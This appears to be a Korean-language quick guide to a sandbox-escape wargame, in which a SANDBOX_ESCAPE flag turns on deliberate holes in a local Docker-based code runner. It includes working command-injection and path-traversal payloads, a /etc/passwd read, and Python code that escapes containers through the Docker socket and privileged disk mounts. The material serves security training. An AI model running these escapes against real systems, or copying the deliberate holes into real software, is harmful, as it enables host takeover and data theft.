# 샌드박스 탈출 워게임 - 간단 가이드

## 🎯 취약점 활성화/비활성화

이제 환경변수 없이 코드 내부의 `SANDBOX_ESCAPE` 변수만으로 취약점을 제어할 수 있습니다!

### 취약점 활성화 (워게임 모드)

**`app/sandbox/manager.py`** 파일 상단:

```python
# ⚠️ 워게임 모드: True로 설정하면 의도적인 취약점이 활성화됩니다
SANDBOX_ESCAPE = True  # ← 이것만 바꾸면 됩니다!
```

**`app/clients/sandbox_client.py`** 파일 상단:

```python
# ⚠️ 워게임 모드: True로 설정하면 의도적인 취약점이 활성화됩니다
SANDBOX_ESCAPE = True  # ← 이것만 바꾸면 됩니다!
```

### 취약점 비활성화 (안전 모드)

```python
SANDBOX_ESCAPE = False  # ← False로 변경
```

---

## 🚀 빠른 시작

### 1단계: 취약점 활성화

두 파일의 `SANDBOX_ESCAPE` 변수를 `True`로 설정 (기본값)

### 2단계: 서버 시작

```bash
python -m uvicorn app.main:app --reload --port 8000
```

### 3단계: 공격 테스트

#### 공격 1: Command Injection (초급)

```bash
curl -X POST http://localhost:8000/sandbox/run \
  -H "Content-Type: application/json" \
  -d '{
    "code": "print(\"hello\")",
    "required_packages": ["numpy; whoami; id; cat /etc/passwd #"]
  }'
```

#### 공격 2: Path Traversal (초급)

```bash
curl -X POST http://localhost:8000/sandbox/run \
  -H "Content-Type: application/json" \
  -d '{
    "code": "import os; print(os.listdir(\"/\"))",
    "run_id": "../../../tmp/pwned"
  }'
```

#### 공격 3: Docker Socket Escape (고급)

```bash
curl -X POST http://localhost:8000/sandbox/run \
  -H "Content-Type: application/json" \
  -d '{
    "code": "import subprocess; print(subprocess.getoutput(\"docker ps\"))"
  }'
```

---

## 📊 `SANDBOX_ESCAPE = True`일 때 활성화되는 취약점

### 🔴 CRITICAL 취약점

- ✅ **Privileged Mode**: 컨테이너가 특권 모드로 실행됨
- ✅ **Docker Socket Mount**: `/var/run/docker.sock`이 컨테이너에 마운트됨

### 🟠 HIGH 취약점

- ✅ **Command Injection**: 패키지 이름을 통한 명령어 주입
- ✅ **Path Traversal**: 파일 경로 조작 가능
- ✅ **Network Access**: 네트워크 격리 해제 (bridge 모드)

### 🟡 MEDIUM 취약점

- ✅ **Docker Exec Injection**: 중첩된 Docker 명령어 조작
- ✅ **SSH Host Key Auto-Accept**: MITM 공격 가능

---

## 🛡️ `SANDBOX_ESCAPE = False`일 때 적용되는 보안

### ✅ 안전 기능

- ✅ **입력 검증**: 패키지 이름 화이트리스트 검증
- ✅ **경로 정규화**: Path Traversal 차단
- ✅ **컨테이너 격리**:
  - privileged=False
  - network_mode=none
  - Docker 소켓 마운트 안 함
  - cap_drop=["ALL"]
  - security_opt=["no-new-privileges"]

---

## 🎓 워게임 난이도별 공략

### LEVEL 1: EASY (5-10분)

**목표**: Command Injection 발견

1. `required_packages` 파라미터 확인
2. 세미콜론(`;`)으로 명령어 체이닝 시도
3. `/etc/passwd` 읽기 성공!

**힌트**: `["requests; cat /etc/passwd #"]`

---

### LEVEL 2: MEDIUM (20-30분)

**목표**: Path Traversal로 임의 경로 접근

1. `run_id` 파라미터 확인
2. `../` 사용하여 경로 탐색
3. `/tmp` 또는 다른 디렉토리 접근

**힌트**: `"run_id": "../../../tmp/escape"`

---

### LEVEL 3: HARD (1-2시간)

**목표**: Docker Socket을 이용한 컨테이너 탈출

1. `/var/run/docker.sock` 존재 확인
2. 컨테이너 내부에서 Docker 명령어 실행
3. 새 컨테이너 생성하여 호스트 파일시스템 마운트

**공격 코드**:

```python
import subprocess

# Docker가 사용 가능한지 확인
result = subprocess.run(['docker', 'ps'], capture_output=True, text=True)
print(result.stdout)

# 호스트 파일시스템을 마운트한 새 컨테이너 생성
subprocess.run([
    'docker', 'run', '--rm', '-v', '/:/host',
    'alpine', 'cat', '/host/etc/hostname'
])
```

---

### LEVEL 4: CRITICAL (2-4시간)

**목표**: Privileged Mode로 완전한 호스트 제어

1. Privileged 모드 확인
2. `/dev` 디렉토리의 장치 파일 접근
3. 호스트 디스크 마운트

**공격 코드**:

```python
import subprocess
import os

# 사용 가능한 장치 확인
print(os.listdir('/dev'))

# 호스트 디스크 마운트 시도
subprocess.run(['mkdir', '-p', '/mnt/host'])
for device in ['/dev/sda1', '/dev/xvda1', '/dev/vda1']:
    if os.path.exists(device):
        subprocess.run(['mount', device, '/mnt/host'])
        print(os.listdir('/mnt/host'))
        break
```

---

## ⚠️ 중요 사항

### 프로덕션 환경 사용 금지

```python
# ❌ 절대 프로덕션에서 True로 설정하지 마세요!
SANDBOX_ESCAPE = True  # 위험!

# ✅ 프로덕션에서는 항상 False
SANDBOX_ESCAPE = False  # 안전
```

### 워게임 종료 후

1. 두 파일 모두 `SANDBOX_ESCAPE = False`로 변경
2. 또는 Git으로 원본 코드 복원
3. 컨테이너 정리: `docker ps -a | grep sandbox`

---

## 🔍 디버깅 팁

### 취약점이 작동하지 않을 때

1. **변수 확인**

   ```python
   # 두 파일 모두 확인!
   # app/sandbox/manager.py
   # app/clients/sandbox_client.py
   SANDBOX_ESCAPE = True  # ← 이게 True인지 확인
   ```

2. **서버 재시작**

   ```bash
   # Ctrl+C로 중단 후
   python -m uvicorn app.main:app --reload --port 8000
   ```

3. **Docker 확인**

   ```bash
   docker --version
   docker ps
   ```

4. **로그 확인**
   - 서버 터미널에서 에러 메시지 확인
   - Docker 컨테이너 로그: `docker logs <container_id>`

---

## 📚 더 알아보기

- `WARGAME_HINTS.md` - 각 취약점별 상세 힌트
- `WARGAME_README.md` - 전체 워게임 가이드

---

**Happy Hacking! 🎯**

_이 취약점들은 교육 목적으로만 사용하세요. 실제 시스템에는 절대 사용하지 마세요!_
